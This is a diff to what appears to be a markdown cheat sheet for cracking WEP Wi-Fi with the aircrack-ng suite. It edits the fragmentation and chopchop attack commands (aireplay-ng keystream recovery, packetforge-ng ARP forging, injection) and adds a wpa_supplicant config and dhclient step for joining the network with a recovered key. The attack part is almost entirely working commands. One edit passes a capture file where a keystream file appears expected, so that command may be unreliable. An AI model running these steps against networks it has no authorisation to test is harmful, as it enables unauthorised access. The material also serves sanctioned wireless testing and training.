@@ -117,13 +117,13 @@ If no ARP request appears, combine with a deauth to force the client to reconnec
 
 ```bash
 # Get PRGA
-aireplay-ng -5 -b $bssid -h $our_mac $interface
+aireplay-ng -5 -b $bssid -h $client_mac $interface
 
 # Check IPs (optional)
 tcpdump -s 0 -n -e -r replay_dec-xxxx-xxxxxx.cap
 
 # Forge ARP request
-packetforge-ng -0 -a $bssid -h $our_mac -k $ap_ip -l $client_ip -y fragment-xxxx.xor -w forged.cap
+packetforge-ng -0 -a $bssid -h $client_mac -k $ap_ip -l $client_ip -y fragment-xxxx.xor -w forged.cap
 
 # Inject
 aireplay-ng -2 -r forged.cap $interface
@@ -146,14 +146,16 @@ Use broadcast `255.255.255.255` for both `-k` and `-l` in `packetforge-ng`. The 
 
 ```bash
 # Get PRGA
-aireplay-ng -4 -b $bssid -h $our_mac $interface
+aireplay-ng -4 -b $bssid -h $client_mac $interface
 
 # Forge ARP request (same as fragmentation)
-packetforge-ng -0 -a $bssid -h $our_mac -k 255.255.255.255 -l 255.255.255.255 -y chopchop-xxxx.xor -w forged.cap
+packetforge-ng -0 -a $bssid -h $client_mac -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-xxxx.cap -w forged.cap
 
 # Inject
 aireplay-ng -2 -r forged.cap $interface
 ```
+
+>If you used fake authentication, replace `$client_mac` with `$our_mac`.
 
 ### Cafe Latte
 
@@ -193,6 +195,25 @@ aircrack-ng -a 1 -b $bssid capture.cap
 # With key length specified (e.g., 64 bits)
 aircrack-ng -a 1 -n 64 -b $bssid capture.cap
 ```
+
+::: details wpa_supplicant
+
+```bash
+# wep.conf
+network={
+    ssid="$ssid"
+    key_mgmt=NONE
+    wep_key0=AABBCCDDEE
+    wep_tx_keyidx=0
+}
+```
+
+```bash
+wpa_supplicant -i $interface -c wep.conf
+sudo dhclient $interface
+```
+
+:::
 
 ### Brute Force
 
